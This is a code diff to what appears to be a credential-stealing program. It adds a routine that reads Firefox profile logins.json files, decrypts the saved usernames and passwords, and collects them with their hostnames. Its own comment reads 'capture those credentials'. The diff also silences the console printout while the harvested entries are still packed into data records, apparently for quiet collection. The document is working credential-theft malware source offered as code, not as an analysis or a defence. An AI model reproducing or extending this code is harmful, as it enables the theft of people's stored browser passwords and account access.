@@ -223,12 +223,70 @@ DATABASE_CREDENTIALS_ENTRIES * list_entriesjson(std::string login_json, int *n) 
 		std::cerr << err << std::endl;
 		return NULL;
 	}
+//http://ameblo.jp/systemtelescope/entry-11820880734.html
+	picojson::object& o = v.get<picojson::object>();
+	picojson::array& array = o["logins"].get<picojson::array>();
+	for (picojson::array::iterator it = array.begin(); it != array.end(); it++)
+	{
+		if (E > 1) {
+			//Lets expand the space for more data
+			ret = (DATABASE_CREDENTIALS_ENTRIES *)realloc(ret, sizeof(DATABASE_CREDENTIALS_ENTRIES) * E);
+		}
+		std::string hostname, realm, name, passw;
+
+		picojson::object& o = it->get<picojson::object>();
+		name = DecryptString(o["encryptedUsername"].get<std::string>());
+		passw = DecryptString(o["encryptedPassword"].get<std::string>());
+
+		std::string hstr = o["hostname"].get<std::string>();
+		char *str = new char[hstr.length() + 1];
+		memcpy(str, hstr.c_str(), hstr.length() + 1);
+		hostname = str == NULL ? "" : str;
+
+//		std::string rstr = o["httpRealm"].get<std::string>();
+		std::string rstr = "";
+		if (!o["httpRealm"].is<picojson::null>())
+			rstr = o["httpRealm"].get<std::string>();
+		char *str1 = new char[rstr.length() + 1];
+		memcpy(str1, rstr.c_str(), rstr.length() + 1);
+		realm = str1 == NULL ? "" : str1;
+
+		char *u = new char[strlen(name.c_str()) + 1];
+		char *p = new char[strlen(passw.c_str()) + 1];
+		char *h = new char[strlen(hostname.c_str()) + 1];
+		char *r = new char[strlen(realm.c_str()) + 1];
+		memcpy((void *)u, name.c_str(), strlen(name.c_str()) + 1);
+		memcpy((void *)p, passw.c_str(), strlen(passw.c_str()) + 1);
+		memcpy((void *)h, hostname.c_str(), strlen(hostname.c_str()) + 1);
+		memcpy((void *)r, realm.c_str(), strlen(realm.c_str()) + 1);
+
+		ret[entries].username = u;
+		ret[entries].password = p;
+		ret[entries].http = h;
+		ret[entries].realm = r;
+		entries++;
+		E++;
+
+		//		picojson::object& e = o["Human"].get<picojson::object>();
+//		CCLog("%s", e["name"].get<std::string>().c_str());
+	}
+	if (entries > 0) {
+		//Lets capture those credentials
+		*n = entries;
+		return ret;
+	}
+	else {
+		printf("\n  No entries found in \"%s\"", login_json.c_str());
+	}
+	return NULL;
+
+	/*
 	picojson::object& o = v.get<picojson::object>()["logins"].get<picojson::object>();
 	o["encryptedUsername"].get<std::string>();
 	o["encryptedPassword"].get<std::string>();
 	o["hostname"].get<std::string>();
 	o["httpRealm"].get<std::string>();
-
+	*/
 
 }
 DATABASE_CREDENTIALS_ENTRIES *list_entries(std::string login_db, int *n) {
@@ -318,7 +376,7 @@ int EnumProfiles(DATABASE_CREDENTIALS_ENTRIES **list) {
 				int n;
 				
 				if (PathFileExists((std::string(path)+std::string("\\logins.json")).c_str())) {
-					*list = (list_entries(std::string(path) + "\\logins.json", &n));
+					*list = (list_entriesjson(std::string(path) + "\\logins.json", &n));
 				}else{
 				*list = (list_entries(std::string(path) + "\\signons.sqlite", &n));
 				}
@@ -350,12 +408,14 @@ char* getAllAuthData() {
 				if (print != NULL) {
 					for (int i = 0; i<n; i++) {
 						AuthData row;
+						/*
 						printf("Entry: %d\n-----\n", i);
 						printf("Username: %s\n", print[i].username);
 						printf("Password: %s\n", print[i].password);
 						printf("URL: %s\n", print[i].http);
 						printf("Realm: %s\n", print[i].realm);
 						printf("\n\n");
+						*/
 						row.Username(print[i].username);
 						row.Password(print[i].password);
 						row.Hostname(print[i].http);
